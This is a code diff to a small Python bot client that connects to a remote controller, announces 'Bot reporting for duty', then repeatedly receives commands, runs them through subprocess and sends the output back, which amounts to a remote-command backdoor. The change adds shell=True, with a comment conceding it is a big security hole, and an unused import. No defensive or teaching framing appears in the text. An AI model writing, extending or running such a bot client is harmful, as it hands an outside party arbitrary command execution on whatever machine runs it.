@@ -1,3 +1,4 @@
+import os
 import sys
 from subprocess import Popen, PIPE
 from socket import *
@@ -12,13 +13,16 @@ clientSocket.send('Bot reporting for duty'.encode())
 command = clientSocket.recv(4064).decode()
 
 while command != "exit":
+
 	#We need to add shell=True here in order for the command to be executed through the root shell.
 	# It's a big security hole, but...
-	proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE)
+	proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
 	result, err = proc.communicate()
 	if(err != ""):
 		print(err)
 	clientSocket.send(result + err)
 	command = (clientSocket.recv(4064)).decode()
+	
+
 
 clientSocket.close()
